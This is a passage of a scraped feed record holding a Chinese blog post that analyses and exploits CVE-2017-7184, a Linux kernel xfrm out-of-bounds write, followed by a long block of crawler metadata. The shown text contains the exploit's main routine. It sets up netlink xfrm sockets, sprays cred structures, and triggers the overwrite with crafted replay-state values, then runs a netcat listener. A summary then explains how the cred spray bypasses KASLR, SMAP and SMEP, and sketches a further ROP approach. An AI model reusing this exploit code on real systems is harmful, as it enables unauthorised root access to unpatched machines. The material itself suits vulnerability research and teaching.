class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> <span class=\"keyword\">const</span> *argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\"><span class=\"keyword\">int</span> spary_n=<span class=\"number\">0xc00</span>,err,xfrm_socket,recvfd,sendfd;</span><br><span class=\"line\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> time = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">xfrm_socket=init_xfrm_socket();</span><br><span class=\"line\"><span class=\"keyword\">if</span> (xfrm_socket&lt;<span class=\"number\">0</span>){</span><br><span class=\"line\"><span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"[-] bad init xfrm socket\\n\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"[+] init xfrm_socket %d \\n\"</span>,xfrm_socket);</span><br><span class=\"line\"></span><br><span class=\"line\">recvfd = init_recvfd();</span><br><span class=\"line\"><span class=\"keyword\">if</span> (recvfd&lt;<span class=\"number\">0</span>){</span><br><span class=\"line\"><span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"[-] bad init_recvfd\\n\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"[+] init recvfd : %d \\n\"</span>,recvfd);</span><br><span class=\"line\">sendfd = init_sendfd();</span><br><span class=\"line\"><span class=\"keyword\">if</span> (recvfd&lt;<span class=\"number\">0</span>){</span><br><span class=\"line\"><span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"[-] bad sendfd\\n\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"[+] init sendfd : %d \\n\"</span>,sendfd);</span><br><span class=\"line\"><span class=\"comment\">//return 0;</span></span><br><span class=\"line\"><span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"[+] start spary %d creds \\n\"</span>,spary_n );</span><br><span class=\"line\">fork_spary_n(spary_n,time);</span><br><span class=\"line\">sleep(<span class=\"number\">5</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">err=xfrm_add_sa(xfrm_socket,<span class=\"number\">4869</span>,<span class=\"number\">0x24</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (err&lt;<span class=\"number\">0</span>){</span><br><span class=\"line\"><span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"[-] bad xfrm_add_sa\\n\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"[+] xfrm_add_sa : %d \\n\"</span>,err);</span><br><span class=\"line\">err=xfrm_new_ae(xfrm_socket,<span class=\"number\">4869</span>,<span class=\"number\">0x24</span>,<span class=\"number\">0xc01</span>,<span class=\"number\">0xb40</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (err&lt;<span class=\"number\">0</span>){</span><br><span class=\"line\"><span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"[-] bad xfrm_new_ae\\n\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"[+] xfrm_new_ae : %d \\n\"</span>,err);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">fork_spary_n(spary_n,<span class=\"number\">10</span>);</span><br><span class=\"line\">sendah(sendfd,<span class=\"number\">4869</span>, htonl(<span class=\"number\">0x1743</span>));</span><br><span class=\"line\">system(<span class=\"string\">\"nc -lp 2333\"</span>);</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>最终效果：</p>\n <p><img src=\"https://wx1.sinaimg.cn/large/d9e4cccely1g08bt2smtmj21b70pwwvx.jpg\" alt=\"提权效果\" /></p>\n <h2 id=\"总结\"><a href=\"http://p4nda.top/2019/02/16/CVE-2017-7184/#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2>\n <p>与之前调试过的漏洞不同在于此漏洞的触发使用了<code>netlink</code>这样的通信机制，因此手册上相关的资料不是很多，需要根据源代码来构造协议中的相应字段。</p>\n <p>本文的分析基于的方法利用了该系统内<code>cred</code>申请是通过<code>kmalloc-192</code>这个<code>kmem_cache</code>得到的，虽然可以有效绕过<code>kaslr</code>、<code>SMAP</code>、<code>SMEP</code>保护，但如果<code>cred</code>申请通过的是<code>cred_jar</code>，则这个方法不一定会成功。</p>\n <p>关于长亭博客中提到的方法，我也还在尝试。利用思路是用每次写1<code>bit</code>的方法，多次写达到覆盖下一<code>xfrm_replay_state_esn</code>中的<code>bmp_len</code>，从而越界读泄露地址来绕过<code>kaslr</code>。并且可以通过越界写的方法来写如<code>file_operations</code>、<code>tty_struct</code>这样的虚表结构，达到劫持控制流的目的，将<code>ROP</code>数据通过<code>do_msgsnd</code>这样的函数布置在内核里，从而绕过<code>SMEP</code>和<code>SMAP</code>，最终利用控制流劫持跳转回<code>ROP</code>。希望可以在后续分析中调出这种方法。</p>\n <h1 id=\"Reference\"><a href=\"http://p4nda.top/2019/02/16/CVE-2017-7184/#Reference\" class=\"headerlink\" title=\"Reference\"></a>Reference</h1>\n <p>[1] <code>https://zhuanlan.zhihu.com/p/26674557</code></p>\n <p>[2] <code>https://github.com/snorez/blog/blob/master/cve-2017-7184%20(%E9%95%BF%E4%BA%AD%E5%9C%A8Pwn2Own%E4%B8%8A%E7%94%A8%E4%BA%8E%E6%8F%90%E6%9D%83Ubuntu%E7%9A%84%E6%BC%8F%E6%B4%9E)%20%E7%9A%84%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8.md</code></p>\n <p>[3] <code>https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm</code></p>\n <p>[4] <code>https://bbs.pediy.com/thread-249192.htm</code></p>\n <p>[5] <code>http://blog.chinaunix.net/uid-26675482-id-3255770.html</code></p>\n <p>[6] <code>http://onestraw.github.io/linux/netlink-event-signal/</code></p>\n <p>[7] <code>http://www.man7.org/linux/man-pages/man7/netlink.7.html</code></p>\n <p>[8] <code>https://github.com/ret2p4nda/linux-kernel-exploits/blob/master/2017/CVE-2017-7308/poc.c</code></p>\n</hr>","descriptionType":"html","publishedDate":"Sat, 16 Feb 2019 07:36:55 +0000","feedId":36259,"bgimg":"https://wx1.sinaimg.cn/mw690/d9e4cccely1g08cr63vyoj20kp0jxwf3.jpg","linkMd5":"61ad171a0ba93a43727a17553da57e31","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn27@2020_6/2020/10/12/21-12-45-584_170d73d404db8b12.webp","destWidth":690,"destHeight":664,"sourceBytes":93944,"destBytes":29088,"author":"","articleImgCdnMap":{"https://wx1.sinaimg.cn/mw690/d9e4cccely1g08cr63vyoj20kp0jxwf3.jpg":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn27@2020_6/2020/10/12/21-12-45-584_170d73d404db8b12.webp","https://wx2.sinaimg.cn/mw690/d9e4cccely1g08crm4y72j20kp0jxt9a.jpg":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn60@2020_4/2020/10/12/21-12-49-068_72204ced5718a3f0.webp","https://ws4.sinaimg.cn/mw690/d9e4cccely1g08d59bb1sj20i00drgli.jpg":null,"https://ws1.sinaimg.cn/mw690/d9e4cccely1g08d6t6z3fj20lh04dt8i.jpg":null,"https://wx2.sinaimg.cn/mw690/d9e4cccely1g08d88sb32j20vs0lfjwr.jpg":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn52@2020_1/2020/10/12/21-12-49-283_a0f829049e3a4a1f.webp","https://wx2.sinaimg.cn/large/d9e4cccely1g099iiczvgj20yt0mgwl5.jpg":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn39@2020_5/2020/10/12/21-12-48-843_9ab1f8ac14f7b9fe.webp","https://ws2.sinaimg.cn/large/d9e4cccely1g09aint3orj20qq0mzadz.jpg":null,"https://wx2.sinaimg.cn/large/d9e4cccely1g09bwjx91qj20q90jftaz.jpg":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn43@2020_2/2020/10/12/21-12-49-231_965ccfdb770136b7.webp","https://wx1.sinaimg.cn/large/d9e4cccely1g08bt2smtmj21b70pwwvx.jpg":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn36@2020_4/2020/10/12/21-12-47-800_b9e8473b458244ba.webp"},"publishedOrCreatedDate":1602537164264}],"record":{"createdTime":"2020-10-13 05:12:44","updatedTime":"2020-10-13 05:12:44","feedId":36259,"fetchDate":"Mon, 12 Oct 2020 21:12:44 +0000","fetchMs":331,"handleMs":162,"totalMs":124190,"newArticles":0,"totalArticles":20,"status":1,"type":0,"ip":"f6db38fc16ee9e62fc92cadc75f25f6b","hostName":"us-004*","requestId":"0a552479281b4d22883c58ba0f6e653f_36259","contentType":"application/xml","totalBytes":543300,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":9,"articlesImgsGithubTotal":6,"successGithubMap":{"myreaderx25":1,"myreaderx32":1,"myreaderx21":1,"myreaderx4":1,"myreaderx12":1,"myreaderx18":1},"failGithubMap":{}},"feed":{"createdTime":"2020-09-07 03:07:11","updatedTime":"2020-09-07 05:20:35","id":36259,"name":"p4nda's blog","url":"http://p4nda.top/atom.xml","subscriber":89,"website":null,"icon":"http://p4nda.top/apple-touch-icon.png","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx64/cdn68@2020_5/2020/09/06/21-20-29-033_5a2eb669a9789f2a.png","description":"","weekly":null,"link":null},"noPictureArticleList":[{"createdTime":"2020-10-13 05:14:47","updatedTime":"2020-10-13 05:14:47","id":null,"feedId":36259,"linkMd5":"61ad171a0ba93a43727a17553da57e31"}],"tmpCommonImgCdnBytes":29088,"tmpBodyImgCdnBytes":514212,"tmpBgImgCdnBytes":0,"extra4":{"start":1602537163743,"total":0,"statList":[{"spend":359,"msg":"获取xml内容"},{"spend":162,"msg":"解释文章"},{"spend":1,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":121526,"msg":"正文链接上传到cdn"}]},"extra5":9,"extra6":6,"extra7ImgCdnFailResultVector":[null,null,null,null,null,null],"extra10_invalidATagHrefValue":{"http://p4nda.top/2019/02/16/CVE-2017-7184/_#漏洞分析":"http://p4nda.top/2019/02/16/CVE-2017-7184/#漏洞分析","http://p4nda.top/2019/02/16/CVE-2017-7184/_#debuggee环境配置":"http://p4nda.top/2019/02/16/CVE-2017-7184/#debuggee环境配置","http://p4nda.top/2019/02/16/CVE-2017-7184/_#利用思路":"http://p4nda.top/2019/02/16/CVE-2017-7184/#利用思路","http://p4nda.top/2019/02/16/CVE-2017-7184/_#权限限制":"http://p4nda.top/2019/02/16/CVE-2017-7184/#权限限制","http://p4nda.top/2019/02/16/CVE-2017-7184/_#xfrm-replay-state-esn结构体更新":"http://p4nda.top/2019/02/16/CVE-2017-7184/#xfrm-replay-state-esn结构体更新","http://p4nda.top/2019/02/16/CVE-2017-7184/_#netlink套接字通信":"http://p4nda.top/2019/02/16/CVE-2017-7184/#netlink套接字通信","http://p4nda.top/2019/02/16/CVE-2017-7184/_#双机调试环境搭建":"http://p4nda.top/2019/02/16/CVE-2017-7184/#双机调试环境搭建","http://p4nda.top/2019/02/16/CVE-2017-7184/_#漏洞触发与利用":"http://p4nda.top/2019/02/16/CVE-2017-7184/#漏洞触发与利用","http://p4nda.top/2019/02/16/CVE-2017-7184/_#Reference":"http://p4nda.top/2019/02/16/CVE-2017-7184/#Reference","http://p4nda.top/2019/02/16/CVE-2017-7184/_#数据包构造":"http://p4nda.top/2019/02/16/CVE-2017-7184/#数据包构造","http://p4nda.top/2019/02/16/CVE-2017-7184/_#EXP":"http://p4nda.top/2019/02/16/CVE-2017-7184/#EXP","http://p4nda.top/2019/02/16/CVE-2017-7184/_#debugging环境配置":"http://p4nda.top/2019/02/16/CVE-2017-7184/#debugging环境配置","http://p4nda.top/2019/02/16/CVE-2017-7184/_#总结":"http://p4nda.top/2019/02/16/CVE-2017-7184/#总结","http://p4nda.top/2019/02/16/CVE-2017-7184/_#xfrm-state结构体生成":"http://p4nda.top/2019/02/16/CVE-2017-7184/#xfrm-state结构体生成","http://p4nda.top/2019/02/16/CVE-2017-7184/_#数组越界写定位":"http://p4nda.top/2019/02/16/CVE-2017-7184/#数组越界写定位","http://p4nda.top/2019/02/16/CVE-2017-7184/_#进入调试":"http://p4nda.top/2019/02/16/CVE-2017-7184/#进入调试"},"extra111_proxyServerAndStatMap":{"http://us-039.herokuapp.com/":{"failCount":1,"successCount":1,"resultList":[200,null]},"http://us-53.herokuapp.com/":{"failCount":1,"successCount":1,"resultList":[200,null]},"http://europe-23.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://europe65.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-002.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe61.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-015.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-027.herokuapp.com/":{"failCount":1,"successCount":1,"resultList":[200,null]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://wx1.sinaimg.cn/mw690/d9e4cccely1g08cr63vyoj20kp0jxwf3.jpg","sourceStatusCode":200,"destWidth":690,"destHeight":664,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn27@2020_6/2020/10/12/21-12-45-584_170d73d404db8b12.webp","sourceBytes":93944,"destBytes":29088,"targetWebpQuality":75,"feedId":36259,"totalSpendMs":2097,"convertSpendMs":35,"createdTime":"2020-10-13 05:12:44","host":"us-011*","referer":"http://p4nda.top/2019/02/16/CVE-2017-7184/","linkMd5ListStr":"61ad171a0ba93a43727a17553da57e31,61ad171a0ba93a43727a17553da57e31","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"91.7 KB","destSize":"28.4 KB","compressRate":"31%"},{"code":1,"isDone":false,"source":"https://wx1.sinaimg.cn/large/d9e4cccely1g08bt2smtmj21b70pwwvx.jpg","sourceStatusCode":200,"destWidth":1699,"destHeight":932,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn36@2020_4/2020/10/12/21-12-47-800_b9e8473b458244ba.webp","sourceBytes":882371,"destBytes":99830,"targetWebpQuality":75,"feedId":36259,"totalSpendMs":2637,"convertSpendMs":58,"createdTime":"2020-10-13 05:12:46","host":"europe61*","referer":"http://p4nda.top/2019/02/16/CVE-2017-7184/","linkMd5ListStr":"61ad171a0ba93a43727a17553da57e31","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"861.7 KB","destSize":"97.5 KB","compressRate":"11.3%"},{"code":1,"isDone":false,"source":"https://wx2.sinaimg.cn/large/d9e4cccely1g099iiczvgj20yt0mgwl5.jpg","sourceStatusCode":200,"destWidth":1253,"destHeight":808,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn39@2020_5/2020/10/12/21-12-48-843_9ab1f8ac14f7b9fe.webp","sourceBytes":962086,"destBytes":146516,"targetWebpQuality":75,"feedId":36259,"totalSpendMs":3467,"convertSpendMs":64,"createdTime":"2020-10-13 05:12:46","host":"us-039*","referer":"http://p4nda.top/2019/02/16/CVE-2017-7184/","linkMd5ListStr":"61ad171a0ba93a43727a17553da57e31","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"939.5 KB","destSize":"143.1 KB","compressRate":"15.2%"},{"code":1,"isDone":false,"source":"https://wx2.sinaimg.cn/mw690/d9e4cccely1g08crm4y72j20kp0jxt9a.jpg","sourceStatusCode":200,"destWidth":690,"destHeight":664,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn60@2020_4/2020/10/12/21-12-49-068_72204ced5718a3f0.webp","sourceBytes":95049,"destBytes":28480,"targetWebpQuality":75,"feedId":36259,"totalSpendMs":3467,"convertSpendMs":56,"createdTime":"2020-10-13 05:12:46","host":"us-53*","referer":"http://p4nda.top/2019/02/16/CVE-2017-7184/","linkMd5ListStr":"61ad171a0ba93a43727a17553da57e31","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"92.8 KB","destSize":"27.8 KB","compressRate":"30%"},{"code":1,"isDone":false,"source":"https://wx2.sinaimg.cn/mw690/d9e4cccely1g08d88sb32j20vs0lfjwr.jpg","sourceStatusCode":200,"destWidth":690,"destHeight":465,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn52@2020_1/2020/10/12/21-12-49-283_a0f829049e3a4a1f.webp","sourceBytes":209943,"destBytes":62682,"targetWebpQuality":75,"feedId":36259,"totalSpendMs":3811,"convertSpendMs":83,"createdTime":"2020-10-13 05:12:46","host":"us-002*","referer":"http://p4nda.top/2019/02/16/CVE-2017-7184/","linkMd5ListStr":"61ad171a0ba93a43727a17553da57e31","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"205 KB","destSize":"61.2 KB","compressRate":"29.9%"},{"code":1,"isDone":false,"source":"https://wx2.sinaimg.cn/large/d9e4cccely1g09bwjx91qj20q90jftaz.jpg","sourceStatusCode":200,"destWidth":945,"destHeight":699,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn43@2020_2/2020/10/12/21-12-49-231_965ccfdb770136b7.webp","sourceBytes":1050525,"destBytes":176704,"targetWebpQuality":75,"feedId":36259,"totalSpendMs":3939,"convertSpendMs":62,"createdTime":"2020-10-13 05:12:46","host":"us-027*","referer":"http://p4nda.top/2019/02/16/CVE-2017-7184/","linkMd5ListStr":"61ad171a0ba93a43727a17553da57e31","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"1 MB","destSize":"172.6 KB","compressRate":"16.8%"}],"successGithubMap":{"myreaderx25":1,"myreaderx32":1,"myreaderx21":1,"myreaderx4":1,"myreaderx12":1,"myreaderx18":1},"failGithubMap":{}}